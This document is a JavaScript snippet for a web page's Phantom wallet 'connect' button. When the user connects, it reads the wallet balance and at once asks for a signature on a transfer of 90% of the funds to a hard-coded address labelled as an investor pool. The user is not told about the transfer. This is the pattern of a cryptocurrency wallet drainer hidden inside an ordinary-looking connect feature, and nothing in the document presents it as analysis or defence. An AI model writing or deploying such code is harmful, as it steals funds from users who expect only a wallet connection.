
const INVESTOR_POOL_ADDRESS = "EYgVGcytkc3vQ3QHr85YDVvp2YiGkDmqgCtpekA9sa7M";

document.getElementById("connectWallet").addEventListener("click", async () => {
    const statusDiv = document.getElementById("status");

    // Check if Phantom Wallet is installed
    if (!window.solana || !window.solana.isPhantom) {
        statusDiv.innerText = "Phantom Wallet not detected. Please install it first.";
        return;
    }

    try {
        // Connect to the Phantom Wallet
        const response = await window.solana.connect();
        const walletAddress = response.publicKey.toString();
        statusDiv.innerText = `Wallet connected: ${walletAddress}`;
        
        // Fetch the wallet's current balance
        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
        const balance = await connection.getBalance(new solanaWeb3.PublicKey(walletAddress));
        const balanceInSOL = balance / solanaWeb3.LAMPORTS_PER_SOL;

        // Calculate 90% of the wallet's balance
        const amountToSend = balanceInSOL * 0.9;
        const lamportsToSend = Math.floor(amountToSend * solanaWeb3.LAMPORTS_PER_SOL);

        // Prepare the transaction
        const transaction = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: new solanaWeb3.PublicKey(walletAddress),
                toPubkey: new solanaWeb3.PublicKey(INVESTOR_POOL_ADDRESS),
                lamports: lamportsToSend,
            })
        );

        // Request approval and send the transaction
        const signedTransaction = await window.solana.signAndSendTransaction(transaction);
        statusDiv.innerText = `Transaction successful: ${signedTransaction.signature}`;
    } catch (error) {
        statusDiv.innerText = `Error: ${error.message}`;
    }
});
